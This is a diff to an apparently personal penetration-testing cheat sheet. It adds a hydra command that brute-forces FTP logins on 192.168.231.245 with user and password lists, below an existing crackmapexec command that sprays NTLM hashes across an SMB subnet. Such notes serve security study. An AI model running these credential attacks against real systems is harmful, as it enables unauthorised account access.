@@ -27,3 +27,7 @@ public:: true
   ```bash
   crackmapexec smb 172.16.197.0/24 -u domain_users.txt -H hashes.txt
   ```
+- FTP
+  ```bash
+  hydra -L users.txt -P passwords.txt -t 4 -V ftp://192.168.231.245
+  ```
